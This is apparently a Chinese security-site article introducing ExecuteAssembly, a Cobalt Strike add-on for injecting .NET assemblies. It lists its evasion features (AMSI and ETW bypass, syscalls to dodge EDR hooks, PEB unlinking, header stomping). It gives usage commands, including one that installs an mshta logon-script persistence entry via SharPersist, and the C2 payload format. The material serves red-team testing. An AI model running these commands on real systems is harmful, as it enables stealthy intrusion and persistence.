![](https://image.3001.net/images/20210315/1615801345_604f2c01ac60c709bf82d.jpg!small)

## 关于ExecuteAssembly

ExecuteAssembly是CS可执行组件的一个替代方案，ExecuteAssembly基于C/C++构建，可以帮助广大研究人员实现.NET程序集的加载和注入。ExecuteAssembly复用了主机进程spawnto来加载CLR模块/AppDomainManager，Stomping加载器/.NET程序集PE
DOS头，并卸载了.NET相关模块，以实现ETW+AMSI绕过。除此之外，它还能够绕过基于NT静态系统调用的EDR钩子，以及通过动态解析API（superfasthash哈希算法）实现隐藏导入。

## 功能介绍

> 从PEB数据结构体中卸载了CLR相关模块；
>
> 对.NET程序集和反射型DLL头进行了流处理；
>
> 使用静态硬编码系统调用绕过EDR钩子；
>
> CLR “AppDomain/AppDomainManager”枚举和重用；
>
> WIn32 API动态解析，基于API响应哈希实现；
>
> 在加载.NET程序集之后实现AMSI和ETW修复；
>
> .NET程序集字节解析，扫描需要加载和使用的CLR版本；
>
> 未使用GetProcAddress/LoadLibrary/GetModuleHandle以实现ETW绕过；
>
> 使用了v4 COM API & 反射DLL注入实现CLR托管；

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/med0x2e/ExecuteAssembly.git

## 工具使用

x64(syscalls)：这个版本主要依赖于使用静态系统调用来绕过EDR钩子，你可以使用这个版本来构建x64版本的DLL（目前只支持x64）。

x86|x64(PEB)：通过遍历PEB模块EAP表并通过superfasthash哈希解析API，在运行时动态检索所需的API地址。但是，这并没有考虑kernel32.dll或ntdll.dll中EDR钩子的设置位置，我们可以使用此版本同时生成x86和x64
DLL，或仅生成x86 DLL，并使用x64（syscalls）版本生成x64 DLL以应对常见的EDR钩子。

使用VS2017或Windows SDK 10.0.17134.0（或兼容SDK版本）构建所需的DLL。

确保已装好了gzip，并且确保相同目录下已存放下列组件，并加载脚本“ExecuteAssembly.cna”：

    
    
    ExecuteAssembly.cna
    
    ExecuteAssembly-x64.dll
    
    ExecuteAssembly-x86.dll

### 命令行接口选项

    
    
    --dotnetassembly: .NET Assembly to load/inject.
    
    --assemblyargs: .NET assembly arguments.
    
    --unlink-modules: Unlink .NET related modules such as CLR/MsCoree related DLLs from PEB data structures.
    
    --stomp-headers: Stomp .NET assembly and reflective DLL PE DOS headers.
    
    --etw: Bypass event tracing on windows (ETW).
    
    --amsi: Bypass AMSI.
    
    --spawnto: Choose spawnto process, list of .NET binaries loading the CLR by default when executed:
    
          - PresentationHost.exe
    
          - stordiag.exe
    
          - ScriptRunner.exe
    
          - caitstatic.exe
    
          - Microsoft.Uev.SyncController.exe
    
          - TsWpfWrp.exe
    
          - UevAgentPolicyGenerator.exe
    
          - UevAppMonitor.exe
    
          - FileHistory.exe
    
          - UevTemplateBaselineGenerator.exe
    
          - UevTemplateConfigItemGenerator.exe

在默认情况下加载CLR并将其设置为spawnto（避免使用已知的LOLBins）。

## 工具使用样例

    
    
    ExecuteAssembly --dotnetassembly /tmp/Seatbelt.exe --assemblyargs LogonSessions --unlink-modules --stomp-headers --amsi --etw --spawnto PresentationHost.exe
    
    
    ExecuteAssembly --amsi --etw --unlink-modules --stomp-headers --dotnetassembly /tmp/ghostpack/SharPersist.exe --assemblyargs -t reg -c "C:\Windows\SysWow64\mshta.exe C:\Users\admin\Downloads\Test2.hta" -k logonscript -m add --spawnto FileHistory.exe
    
    
    ExecuteAssembly --unlink-modules --stomp-headers --dotnetassembly /tmp/ghostpack/SharPersist.exe --assemblyargs -t reg -k "logonscript" -v "C:\Windows\SysWow64\mshta.exe C:\Users\admin\Downloads\Test.hta" -m remove --spawnto FileHistory.exe
    
    
    ExecuteAssembly --unlink-modules --amsi --dotnetassembly /tmp/ghostpack/SharpWMI.exe --assemblyargs action=query computername=localhost query="select * from win32_service" --spawnto FileHistory.exe
    
    
    ExecuteAssembly --amsi --etw --dotnetassembly /tmp/ghostpack/SharpWMI.exe --assemblyargs action=query query="select * from win32_process" --spawnto PresentationHost.exe

## C2支持

该功能主要用于支持和测试Cobalt Strike，但是它也可以跟其他C2框架（比如MSF等）配合一起使用。但是别忘了反射DLL
DLLMAIN需要以单独一行Payload作为参数，格式如下：

    
    
    AMSI_FLAG|ETW_FLAG|STOMPHEADERS_FLAG|UNLINKMODULES_FLAG|LL_FLAG.LENGTH_FLAG.B64_ENCODED_COMPRESSED_PAYLOAD [SPACE SEPARATED ARGUMENTS]

> AMSI_FLAG: 0或1；
>
> ETW_FLAG: 0或1；
>
> STOMPHEADERS_FLAG: 0或1；
>
> UNLINKMODULES_FLAG: 0或1；
>
> LENGTH_FLAG: .NET程序集字节大小；
>
> LL_FLAG: LENGTH_FLAG的长度；
>
> B64_ENCODED_COMPRESSED_PAYLOAD: Gzip压缩和Base64编码的.NET程序集；
>
> [SPACE SEPARATED ARGUMENTS]: .NET程序集参数；

## 项目地址

ExecuteAssembly：【[ _GitHub传送门_](https://github.com/med0x2e/ExecuteAssembly)】

## 参考资料

> [
> _https://github.com/stephenfewer/ReflectiveDLLInjection_](https://github.com/stephenfewer/ReflectiveDLLInjection)
>
> [
> _https://github.com/jthuraisamy/SysWhispers_](https://github.com/jthuraisamy/SysWhispers)
>
> [
> _https://github.com/etormadiv/HostingCLR_](https://github.com/etormadiv/HostingCLR)
>
> [
> _https://github.com/outflanknl/TamperETW/_](https://github.com/outflanknl/TamperETW/)
>
> [ _https://github.com/LloydLabs/Windows-API-> Hashing_](5%E3%80%81https%3A/github.com/LloydLabs/Windows-API-Hashing)
>
> [ _http://www.rohitab.com/discuss/topic/42077-module-pebldr-hiding-> all-4-methods-x64/_](http://www.rohitab.com/discuss/topic/42077-module-> pebldr-hiding-all-4-methods-x64/)
>
> [
> _https://gist.github.com/christophetd/37141ba273b447ff885c323c0a7aff93﻿_](https://gist.github.com/christophetd/37141ba273b447ff885c323c0a7aff93)

